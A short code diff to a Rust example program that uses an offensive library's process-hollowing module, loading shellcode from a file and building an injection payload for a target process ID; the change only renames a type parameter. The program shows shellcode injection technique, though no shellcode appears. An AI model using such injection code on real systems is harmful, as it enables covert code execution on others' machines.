@@ -1,6 +1,6 @@
 use std::env::{args, current_dir};
 
-use linc::payload::{Existing, Payload, PayloadType};
+use linc::payload::{Inject, Payload, PayloadType};
 use linc::techniques::inject::hollow;
 
 fn main() {
@@ -17,7 +17,7 @@ fn main() {
     let shellcode = format!("{}/assets/shellcode.bin", cwd);
 
     // Change target PID
-    let payload = Payload::<Existing>::from_file(&shellcode, PayloadType::Shellcode, pid);
+    let payload = Payload::<Inject>::from_file(&shellcode, PayloadType::Shellcode, pid);
 
     let payload = match payload {
         Ok(p) => p,
